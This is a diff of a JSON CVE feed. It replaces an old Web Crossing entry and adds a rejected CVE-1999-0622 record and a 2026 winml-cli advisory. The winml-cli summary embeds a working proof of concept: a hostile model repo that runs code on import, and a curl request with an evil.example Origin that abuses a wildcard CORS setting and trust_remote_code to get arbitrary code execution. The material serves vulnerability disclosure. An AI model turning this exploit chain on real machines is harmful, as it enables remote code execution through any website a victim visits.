+        "https://github.com/nltk/nltk/releases/tag/v3.10.0"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "nltk pip"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-0245",
-      "summary": "Web Crossing 4.x and 5.x allows remote attackers to cause a denial of service (crash) by sending a HTTP POST request with a large or negative Content-Length, which causes an integer divide-by-zero.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2004-11-23",
+      "id": "CVE-2026-84452",
+      "summary": "Case Description:\n\nMSRC Notes: Attachments: 1 file(s) attached (1 mp4) Summary: The vulnerability lies in the 'serve/cli_api.py' component of the 'winml-cli' project, which exposes all winml CLI commands over HTTP without authentication. Although it binds to localhost by default, it sets 'allow_origins' to a wildcard, allowing any website to interact with the endpoint. This, combined with the '--trust-remote-code' flag in 'build' and 'config' commands, enables an attacker to execute arbitrary code by hosting a malicious model repository. The root cause is the lack of proper authentication and validation of the 'trust_remote_code' parameter, leading to Remote Code Execution (RCE).\n\nFinder Description: WARNING: Original content contained invalid characters. Please see original submission in the event that the characters removed are relevant for the PoC.\n\nserve/cli_api.py exposes every winml CLI command over HTTP with no authentication. That's defensible on its own - it binds 127.0.0.1 by default, so the audience is this machine. But it also sets allow_origins=[\"*\"] (cli_api.py:150, duplicated at app.py:219), and the victim's browser is a local process: the wildcard lets any website call the endpoint and read the reply, erasing the boundary the loopback bind draws.\n\nbuild and config both accept --trust-remote-code, and a JSON true becomes that flag unfiltered. An attacker-named model repo reaches AutoConfig.from_pretrained(..., trust_remote_code=True) (_autoconfig.py:191), where transformers imports Python from that repo - RCE as the server user from any page the victim loads. The payload runs on import, so the command's exit_code: 1 is irrelevant.\n\nReported Repro Steps:\n\n1. Setup\n\ngit clone -q https://github.com/microsoft/winml-cli.git ~/winml-poc && cd ~/winml-poc &&  mkdir -p temp /tmp/poc/evil/pwn\npython3 -m pip install -q --target /tmp/poc/deps onnx onnxruntime transformers fastapi uvicorn click\n2. Hostile model repo (payload is module-level → runs on import)\n\ncat > /tmp/poc/evil/pwn/config.json <<'EOF'\n{\"model_type\":\"pwn\",\"auto_map\":{\"AutoConfig\":\"configuration_pwn.PwnConfig\"}}\nEOF\ncat > /tmp/poc/evil/pwn/configuration_pwn.py <<'EOF'\nimport getpass, os, socket, time\nfrom transformers import PretrainedConfig\nwith open(os.environ[\"PWN_MARKER\"], \"w\") as f:\n    f.write(f\"ARBITRARY CODE EXECUTION\\ntime={time.strftime('%F %T')}\\n\"\n            f\"user={getpass.getuser()}\\nhost={socket.gethostname()}\\npid={os.getpid()}\\n\")\nclass PwnConfig(PretrainedConfig):\n    model_type = \"pwn\"\nEOF\n3. Start server\n\nWindows: python -m uvicorn winml.modelkit.serve.cli_api:app --host 127.0.0.1 --port 8000\n\nLinux needs a stub for the Windows-only PDH module (no security relevance):\n\ncat > /tmp/poc/serve.py <<'EOF'\nimport os, sys, types, uvicorn\nm = types.ModuleType(\"winml.modelkit.session.monitor._pdh\")\nclass PdhPoller:\n    def __init__(s,*a,**k): pass\n    def start(s,*a,**k): pass\n    def stop(s,*a,**k): pass\n    def poll(s,*a,**k): return {}\n    def sample(s,*a,**k): return {}\n    def close(s,*a,**k): pass\nm.PdhPoller = PdhPoller; m.PDH_AVAILABLE = False\nsys.modules[\"winml.modelkit.session.monitor._pdh\"] = m\nfrom winml.modelkit.serve.cli_api import app\nuvicorn.run(app, host=\"127.0.0.1\", port=8000, log_level=\"warning\")\nEOF\ncd ~/winml-poc && PWN_MARKER=~/winml-poc/temp/PWNED PYTHONPATH=src:/tmp/poc/deps setsid nohup python3 /tmp/poc/serve.py >/tmp/poc/log 2>&1 </dev/null &\nsleep 8; until curl -sf -o /dev/null -m 1 http://127.0.0.1:8000/openapi.json; do sleep 1; done; echo up\n4. Exploit\n\ncurl -s -D- -o /dev/null -X POST http://127.0.0.1:8000/v1/cli/build \\\n -H 'Origin: https://evil.example' -H 'Content-Type: application/json' \\\n -d '{\"args\":{\"model\":\"/tmp/poc/evil/pwn\",\"output_dir\":\"/tmp/poc/out\",\"trust_remote_code\":true}}' \\\n | grep -iE '^HTTP|^access-control-allow-origin'\ncat ~/winml-poc/temp/PWNED\nHTTP/1.1 200 OK\naccess-control-allow-origin: *\nARBITRARY CODE EXECUTION\ntime=2026-08-17 11:24:35\nuser=shrini  host=Shrinivasan  pid=11616",
+      "cvssScore": 8.6,
+      "severity": "High",
+      "published": "2026-09-08",
+      "modified": "2026-09-08",
+      "cwe": {
+        "cwe_id": "CWE-306",
+        "name": "Missing Authentication for Critical Function"
+      },
+      "references": [
+        "https://github.com/microsoft/winml-cli/security/advisories/GHSA-96p9-rh4f-92cf",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-84452",
+        "https://github.com/microsoft/winml-cli/pull/1321",
+        "https://github.com/microsoft/winml-cli/commit/f4073e0ef4700a25b623487e7e45c421ca0b9993",
+        "https://github.com/advisories/GHSA-96p9-rh4f-92cf"
+      ],
+      "vulnerableProducts": [
+        "winml-cli pip"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0622",
+      "summary": "Rejected reason: DO NOT USE THIS CANDIDATE NUMBER.  ConsultIDs: None.  Reason: this candidate is solely about a configuration that does not directly introduce security vulnerabilities, so it is more appropriate to cover under the Common Configuration Enumeration (CCE).  Notes: the former description is: \"A component service related to DNS service is running.",
+      "cvssScore": null,
+      "severity": "Unknown",
+      "published": "1999-01-01",
       "modified": null,
       "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=107586518120516&w=2",
-        "http://www.securityfocus.com/bid/9576",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15022",
-        "http://marc.info/?l=bugtraq&m=107586518120516&w=2",
-        "http://www.securityfocus.com/bid/9576"
-      ],
+      "references": [],
       "vulnerableProducts": [],
       "isExploited": false
     }
